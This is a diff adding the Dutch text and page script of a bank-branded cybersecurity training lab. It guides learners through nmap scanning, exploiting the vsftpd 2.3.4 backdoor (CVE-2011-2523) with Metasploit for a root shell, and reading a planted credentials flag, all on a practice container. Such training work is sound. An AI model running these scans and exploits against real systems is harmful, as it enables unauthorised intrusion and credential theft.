+          badge: "ING Factory • ideeën die het waard zijn om te bouwen",
+          title: "🔐 Cybersecurity Bewustzijn Lab",
+          subtitle: "Veiligheidskennis Opbouwen Door Veilig, Hands-On Leren"
+        },
+        score: { progress: "Voortgang", steps: "Stappen" },
+        welcome: "🎯 <strong>Welkom!</strong> Dit lab leert cybersecurity-bewustzijn door middel van gecontroleerde, educatieve oefeningen. Geen voorafgaande technische ervaring nodig - we begeleiden je stap voor stap!",
+        challenge0: {
+          title: "🚀 Stap 0: Verbinding maken met je Lab-omgeving",
+          difficulty: "START HIER",
+          description: "<strong>Wat je gaat doen:</strong> Voordat we kunnen beginnen met leren over beveiliging, moeten we verbinding maken met onze oefenomgeving. Zie dit als inloggen op een computer die speciaal is ingesteld om veilig te leren. We hebben twee containers met Docker op je machine voor je klaargezet om mee te spelen.<br><br><strong>Log altijd in op je Kali Linux-container om de oefeningen te doen.</strong>",
+          setupTitle: "🖥️ Jouw Lab-opstelling",
+          diagramContent: `<div>🖥️ <strong>Kali Linux</strong> (<span>Jouw Aanvalsmachine</span>) $kali_ip </div>
+          <div>↕️</div>
+          <div>🎯 <strong>Kwetsbaar Doelwit</strong> (<span>Oefenmachine</span>) $badweb_ip</div>`,
+          hints: {
+            kaliLinux: "🤔 Wat is Kali Linux?",
+            docker: "🔧 Wat is Docker?",
+            ing: "🔧 Hoe gebruikt ING Docker?",
+            connect: "📚 Hoe maak je verbinding", 
+            command: "💻 Verbindingscommando",
+            solution: "🚨 Volledige Oplossing",
+            kaliLinuxContent: `<h4>🤔 Wat is Kali Linux?</h4>
+                              <p><strong>Kali Linux is een speciale versie van het Linux-besturingssysteem, ontworpen voor cybersecurity-professionals en -liefhebbers.</strong> Zie het als een digitale gereedschapskist met honderden vooraf geïnstalleerde tools voor penetratietesten, beveiligingsonderzoek, computerforensisch onderzoek en reverse engineering.</p>
+                              <div class="security-tip">
+                                <strong>Belangrijkste Kenmerken:</strong>
+                                <ul>
+                                  <li><strong>Vooraf geïnstalleerde tools:</strong> Wordt geleverd met meer dan 600 tools voor penetratietesten zoals Nmap, Wireshark, Metasploit en Aircrack-ng.</li>
+                                  <li><strong>Veilige omgeving:</strong> Gebouwd op een solide basis, is het een betrouwbaar platform voor beveiligingstaken.</li>
+                                  <li><strong>Aanpasbaar:</strong> Zeer flexibel, waardoor gebruikers het kunnen aanpassen aan hun specifieke behoeften.</li>
+                                  <li><strong>Industriestandaard:</strong> Wereldwijd erkend en gebruikt door beveiligingsprofessionals.</li>
+                                </ul>
+                              </div>
+                              <p>In dit lab gebruik je Kali Linux als je "aanvalsmachine" om te leren hoe deze krachtige tools worden gebruikt in een veilige, gecontroleerde omgeving.</p>`,
+            dockerContent: `<h4>🐳 Docker Begrijpen</h4>
+                            <p><strong>Wat is Docker?</strong> Zie Docker als het hebben van meerdere computers binnen je eigen computer. 
+                            Elke "container" is als een aparte, geïsoleerde computer die je echte computer niet kan beïnvloeden.</p>`,
+            connectContent: `<h4>🔌 Hoe maak je verbinding met je Lab</h4>
+                            <div class="step-by-step">
+                              <div class="step">
+                                <strong>Open je terminal/command prompt</strong>
+                                <ul>
+                                  <li><strong>Windows:</strong> Druk op Win+R, typ "cmd", druk op Enter</li>
+                                  <li><strong>Mac:</strong> Druk op Cmd+Spatie, typ "terminal", druk op Enter</li>
+                                  <li><strong>Linux:</strong> Druk op Ctrl+Alt+T</li>
+                                </ul>
+                              </div>
+                            </div>`,
+            commandContent: `<h4>💻 Het Verbindingscommando</h4>
+                            <p><strong>Typ dit exacte commando in je terminal:</strong></p>
+                            <div class="code-wrapper">
+                                <div class="command-line">docker exec -it kali bash</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                            </div>`,
+            ingContent: `<h4>🏭 Hoe gebruikt ING Docker?</h4>
+                        <p><strong>Docker wordt gebruikt in de ICHP-omgeving</strong></p>
+                        <p>Dit is het mechanisme dat veel van de diensten en aanbiedingen van ING aan onze gewaardeerde klanten beheert en ons in staat stelt om wendbaar te zijn in ons dienstenaanbod, terwijl we beveiliging van wereldklasse bieden.</p>
+                        <br>
+                        <div class="security-tip">
+                          <strong>🏦 ING's Containerstrategie:</strong>
+                          <ul>
+                            <li>🔄 <strong>Microservices:</strong> Applicaties opdelen in kleinere, beheersbare stukken</li>
+                            <li>🚀 <strong>Snelle Implementatie:</strong> Snelle updates en rollbacks voor een betere klantervaring</li>
+                            <li>🛡️ <strong>Isolatie:</strong> Elke dienst draait onafhankelijk voor verbeterde beveiliging</li>
+                            <li>📈 <strong>Schaalbaarheid:</strong> Efficiënt omgaan met wisselende klantbelastingen</li>
+                          </ul>
+                        </div>`,
+          },
+          solutionContent: `<div class="step-by-step">
+                            <div class="step">
+                              <strong>Open je terminal</strong>
+                            </div>
+                            <div class="step">
+                              <strong>Maak verbinding met Kali Linux</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">docker exec -it kali bash</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Controleer of je verbonden bent</strong>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">root@kali:~# </div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                          </div>
+                          <button class="hint-button" onclick="completeChallenge(0, 20)" data-key="challenge0.complete">✅ Ik ben Verbonden!</button>`,
+          complete: "✅ Ik ben Verbonden!"
+        },
+        challenge1: {
+          title: "🔍 Stap 1: Ontdekken wat er op het netwerk is",
+          difficulty: "BEGINNER",
+          description: "<strong>Wat je leert:</strong> Hoe aanvallers ontdekken welke computers en diensten beschikbaar zijn op een netwerk.<br><br><strong>Jouw missie:</strong> Ontdek welke diensten er op de doelmachine draaien en identificeer eventuele beveiligingslekken.",
+          hints: {
+            scanning: "🤔 Wat is Netwerkscannen?",
+            tool: "🛠️ Het Juiste Gereedschap",
+            command: "📋 Het Commando Begrijpen",
+            solution: "🚨 Volledige Oplossing",
+            scanningContent: `<h4>🌐 Netwerkscannen Begrijpen</h4>
+                              <p><strong>Wat is netwerkscannen?</strong> Stel je voor dat je in de gang van een hotel bent. Netwerkscannen is als het kijken naar elke deur om te zien welke kamers er zijn en in welke kamers mensen zijn.</p>`,
+            toolContent: `<h4>🔧 Maak kennis met Nmap</h4>
+                          <p><strong>Nmap:</strong> De "Network Mapper" - 's werelds beroemdste tool voor netwerkscannen! Onze eerste stap is om te ontdekken welke machines actief zijn op het netwerk. Dit kunnen we doen met een simpele "ping scan".</p>
+                          <div class="code-wrapper">
+                              <div class="command-line">nmap -sn 172.19.0.0/24</div>
+                              <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                          </div>
+                          <p>Dit commando stuurt een ping naar elk mogelijk adres in het bereik en toont de adressen die reageren.</p>
+                          <div class="code-wrapper">
+                              <div class="terminal-output">Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-27 10:30 UTC
+      Nmap scan report for kali.demo (172.19.0.2)
+      Host is up (0.000010s latency).
+      Nmap scan report for badweb.demo (172.19.0.3)
+      Host is up (0.000020s latency).
+      Nmap done: 256 IP addresses (2 hosts up) scanned in 2.50 seconds</div>
+                              <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                          </div>
+                          <p>De scan heeft twee machines gevonden. De ene is onze eigen machine (kali), en de andere is ons doelwit ($badweb_ip). Nu we het IP-adres van het doelwit hebben, kunnen we een meer gedetailleerde scan uitvoeren om openstaande diensten te vinden.</p>`,
+            commandContent: `<h4>📚 Het Volledige Commando</h4>
+                            <div class="code-wrapper">
+                                <div class="command-line">nmap -sV -p 1-100 --script vulners $badweb_ip</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                            </div>
+                            <p>Dit scant poorten 1-100 op ons specifieke doelwit, identificeert de actieve diensten (<code>-sV</code>), en controleert op bekende kwetsbaarheden met het \`vulners\` script.</p>`,
+          },
+          solutionContent: `<div class="step-by-step">
+                            <div class="step">
+                              <strong>Maak verbinding met Kali Linux</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">docker exec -it kali bash</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Ontdek actieve machines op het netwerk</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">nmap -sn 172.19.0.0/24</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">...
+      Nmap scan report for badweb.demo (172.19.0.3)
+      Host is up...
+      ...</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Voer een gedetailleerde scan uit op het doelwit</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">nmap -sV -p 1-100 --script vulners $badweb_ip</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Resultaten tonen de vsftpd-kwetsbaarheid</strong>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">Nmap scan report for badweb.demo (172.19.0.3)
+      Host is up (0.0000050s latency).
+      Not shown: 98 closed tcp ports (reset)
+      PORT   STATE SERVICE VERSION
+      21/tcp open  ftp     vsftpd 2.3.4
+      | vulners:
+      |   vsftpd 2.3.4:
+      |       CVE-2011-2523 10.0 https://vulners.com/cve/CVE-2011-2523
+      80/tcp open  http    lighttpd 1.4.59
+      |_http-server-header: lighttpd/1.4.59
+
+      Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                          </div>
+                          <button class="hint-button" onclick="completeChallenge(1, 25)" data-key="challenge1.complete">✅ Ik heb de kwetsbaarheid gevonden!</button>`,
+          complete: "✅ Ik heb de kwetsbaarheid gevonden!"
+        },
+        challenge2: {
+          title: "💥 Stap 2: De kwetsbaarheid misbruiken", 
+          difficulty: "GEMIDDELD",
+          description: "<strong>Wat je leert:</strong> Hoe je de backdoor-kwetsbaarheid die je hebt gevonden, kunt misbruiken.<br><br><strong>Jouw missie:</strong> Gebruik Metasploit om CVE-2011-2523 te misbruiken en controle te krijgen over het doelwit.<br><br>Op de server $badweb_hostname staan de <strong>inloggegevens van de bankrekening</strong>, kijk of je ze kunt <strong>vinden</strong>. Misschien heeft een gebruiker ze?",
+          hints: {
+            backdoor: "🎭 Wat is een Backdoor?",
+            metasploit: "🛠️ Maak kennis met Metasploit",
+            exploit: "🔍 De Exploit Vinden",
+            solution: "🚨 Volledige Oplossing",
+            flag: "🚩 Pak de Vlag",
+            backdoorContent: `<h4>🎭 Backdoors Begrijpen</h4>
+                              <p>CVE-2011-2523 is een backdoor in vsftpd 2.3.4. Wanneer je een gebruikersnaam verstuurt die eindigt op ":)", wordt er een geheime shell geopend op poort 6200.</p>`,
+            metasploitContent: `<h4>🚀 Metasploit Framework</h4>
+                                <p>Metasploit is als een "Zwitsers zakmes" voor het testen van cybersecurity, met duizenden bekende exploits.</p>`,
+            exploitContent: `<h4>🔍 De Juiste Exploit Vinden</h4>
+                            <p>Start Metasploit, zoek naar vsftpd en gebruik de backdoor-exploit:</p>
+                            <div class="code-wrapper">
+                                <div class="command-line">msfconsole</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                            </div>
+                            <div class="code-wrapper">
+                                <div class="command-line">search vsftpd</div>
+                                <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                            </div>`,
+            flagContent: `<h4>🚩 De Vlag Veroveren</h4>
+                          <p>Zodra je een root-shell hebt, moet je door het bestandssysteem navigeren om gevoelige informatie te vinden. De home-mappen van gebruikers zijn een goede plek om te beginnen met zoeken naar bestanden.</p>
+                          
+                          <div class="step-by-step">
+                              <div class="step">
+                                  <strong>Navigeer naar de home-map van een gebruiker.</strong>
+                                  <p>Het <code>cd</code>-commando (Change Directory) stelt je in staat om tussen mappen te wisselen. Laten we de map 'Documents' van een gebruiker controleren.</p>
+                                  <div class="code-wrapper">
+                                      <div class="command-line">cd /home/socrates/Documents</div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                                  </div>
+                              </div>
+                              <div class="step">
+                                  <strong>Toon de bestanden in de map.</strong>
+                                  <p>Gebruik het <code>ls</code>-commando om te zien wat erin staat.</p>
+                                  <div class="code-wrapper">
+                                      <div class="command-line">ls</div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                                  </div>
+                                  <div class="code-wrapper">
+                                      <div class="terminal-output">
+                                          bank.txt
+                                          notes.txt
+                                      </div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                                  </div>
+                              </div>
+                              <div class="step">
+                                  <strong>Toon de inhoud van het bestand.</strong>
+                                  <p>Het <code>cat</code>-commando leest en toont de inhoud van een bestand. Laten we eens kijken wat er in \`bank.txt\` staat.</p>
+                                  <div class="code-wrapper">
+                                      <div class="command-line">cat bank.txt</div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                                  </div>
+                                  <div class="code-wrapper">
+                                      <div class="terminal-output">
+                                          FLAG{B4nk_D3t41l_F0und_GG}
+                                          Username: ing_user
+                                          Password: SecurePassword123!
+                                      </div>
+                                      <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                                  </div>
+                              </div>
+                          </div>
+                          <div class="security-tip">
+                              <strong>Hint:</strong> Als engineer weet je dat niet alles is wat het lijkt. Sommige bestanden verbergen zich in het volle zicht en beginnen met een punt. Dit bestand is speciaal, het bevat de <span style='color: #ff9933;'>cred</span>entials die je zoekt, maar de bestandsnaam zelf is een beetje... onconventioneel. Denk na over welke tekens geldig zijn in bestandsnamen, maar niet vaak worden gebruikt.
+                               <div class="code-wrapper">
+                                  <div class="command-line">ls -la</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                          </div>`,
+          },
+          solutionContent: `<div class="step-by-step">
+                            <div class="step">
+                              <strong>Maak verbinding met Kali Linux</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">docker exec -it kali bash</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Start Metasploit</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">msfconsole</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Vind de exploit</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">search vsftpd</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="command-line">use exploit/unix/ftp/vsftpd_234_backdoor</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Configureer en val aan</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">set RHOSTS $badweb_ip</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="command-line">exploit</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                            <div class="step">
+                              <strong>Je hebt nu root-toegang!</strong>
+                              <div class="code-wrapper">
+                                  <div class="command-line">whoami</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                              <div class="code-wrapper">
+                                  <div class="terminal-output">root</div>
+                                  <button class="copy-code-button" onclick="copyCode(event)" data-copied-text="Gekopieerd!">Kopieer</button>
+                              </div>
+                            </div>
+                          </div>
+                          <button class="hint-button" onclick="completeChallenge(2, 30)" data-key="challenge2.complete">✅ Ik heb het systeem overgenomen!</button>`,
+          complete: "✅ Ik heb het systeem overgenomen!"
+        },
+        completion: {
+          title: "🏆 ING Factory Security Training Voltooid!",
+          content: `<div class="ing-factory-badge" data-key="completion.badge"></div>
+                    <br>
+                    <strong data-key="completion.learned"></strong>
+                    <ul data-key-list="completion.points">
+                    </ul>
+                    <br>
+                    <strong data-key="completion.apply"></strong>
+                    <ul data-key-list="completion.tips">
+                    </ul>`,
+          badge: "Gefeliciteerd - Je Hebt Beveiligingskennis Opgebouwd!",
+          learned: "🎓 Wat je hebt geleerd:",
+          points: [
+            "🔍 Netwerkverkenning en het ontdekken van kwetsbaarheden",
+            "💥 Hoe beveiligingsfouten worden misbruikt door aanvallers", 
+            "🛡️ Hoe te denken als een aanvaller en een verdediger"
+          ],
+          apply: "🏭 Pas dit toe in je dagelijkse werk:",
+          tips: [
+            "✅ Gebruik unieke, sterke wachtwoorden met een wachtwoordmanager",
+            "✅ Houd software up-to-date om kwetsbaarheden te patchen",
+            "✅ Gebruik WPA3 WiFi-versleuteling met complexe wachtwoorden",
+            "✅ Vermijd openbare WiFi voor gevoelige activiteiten", 
+            "✅ Wees achterdochtig bij onverwachte e-mails en links",
+            "✅ Meld beveiligingsproblemen bij je IT-team"
+          ]
+        }
+      }
+    };
+
+    // --- DOM Interaction Functions ---
+
+    function toggleHint(hintId, buttonElement) {
+        const hint = document.getElementById(hintId);
+        if (!hint) return;
+
+        const isVisible = hint.style.display === 'block';
+        hint.style.display = isVisible ? 'none' : 'block';
+
+        if (!isVisible && buttonElement) {
+            const color = buttonElement.getAttribute('data-color');
+            if (color) {
+                hint.style.borderColor = color;
+            }
+            hint.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+    }
+
+    function toggleAnswer(answerId, buttonElement) {
+        const answer = document.getElementById(answerId);
+        if (!answer) return;
+
+        const isVisible = answer.style.display === 'block';
+        answer.style.display = isVisible ? 'none' : 'block';
+        
+        if (!isVisible && buttonElement) {
+            const color = buttonElement.getAttribute('data-color');
+            if (color) {
+                answer.style.borderColor = color;
+            }
+            answer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+    }
+
+    function completeChallenge(challengeId, points) {
+        if (challengeCompletionStatus[challengeId]) {
+            return; // Already completed
+        }
+
+        challengeCompletionStatus[challengeId] = true;
+        const challengeCard = document.getElementById(`challenge${challengeId}`);
+        if (challengeCard) {
+            challengeCard.classList.add('completed');
+            const button = challengeCard.querySelector(`.answer-content .hint-button`);
+            if (button) button.disabled = true;
+        }
+
+        totalScore += points;
+        completedChallengesCount++;
+        updateProgressUI();
+    }
+
+    function updateProgressUI() {
+        document.getElementById('score').textContent = totalScore;
+        document.getElementById('completed').textContent = completedChallengesCount;
+
+        const progressPercentage = (totalScore / 75) * 100;
+        document.getElementById('progressBar').style.width = `${progressPercentage}%`;
+        
+        if (completedChallengesCount === totalChallenges) {
+            const completionEl = document.getElementById('completion');
+            if(completionEl) {
+                completionEl.style.display = 'block';
+                completionEl.scrollIntoView({ behavior: 'smooth' });
+            }
+        }
+    }
+
+    // --- Language and Content Update Functions ---
+
+    function setLanguage(lang) {
+        currentLanguage = lang;
+        document.getElementById('btn-en').classList.toggle('active', lang === 'en');
+        document.getElementById('btn-nl').classList.toggle('active', lang === 'nl');
+        updateAllText();
+    }
+
+    function getTranslation(key) {
+        const keys = key.split('.');
+        let result = translations[currentLanguage];
+        for (const k of keys) {
+            if (result === undefined) return key;
+            result = result[k];
+        }
+        return result;
+    }
+
+    function updateAllText() {
+        document.querySelectorAll('[data-key]').forEach(element => {
+            const key = element.getAttribute('data-key');
+            const translation = getTranslation(key);
+            if (translation !== undefined) {
+               element.textContent = translation;
+            }
+        });
+
+        document.querySelectorAll('[data-key-html]').forEach(element => {
+            const key = element.getAttribute('data-key-html');
+            const translation = getTranslation(key);
+            if (translation !== undefined) {
+                element.innerHTML = translation;
+            }
+        });
+        
+        document.querySelectorAll('[data-key-list]').forEach(ul => {
+            const key = ul.getAttribute('data-key-list');
+            const listItems = getTranslation(key);
+            if(Array.isArray(listItems)) {
+                ul.innerHTML = listItems.map(item => `<li>${item}</li>`).join('');
+            }
+        });
+    }
+
+    function copyCode(event) {
+        const button = event.target;
+        const codeWrapper = button.parentElement;
+        const codeElement = codeWrapper.querySelector('.command-line, .terminal-output');
+        const textToCopy = codeElement.innerText;
+
+        const textArea = document.createElement('textarea');
+        textArea.value = textToCopy;
+        document.body.appendChild(textArea);
+        textArea.select();
+        try {
+            document.execCommand('copy');
+            button.classList.add('copied');
+            setTimeout(() => {
+                button.classList.remove('copied');
+            }, 2000);
+        } catch (err) {
+            console.error('Failed to copy text: ', err);
+        }
+        document.body.removeChild(textArea);
+    }
+
+
+    // --- Initialisation ---
+    document.addEventListener('DOMContentLoaded', () => {
+        setLanguage('en');
+    });
+
+</script>
+
+</body>
+</html>
+
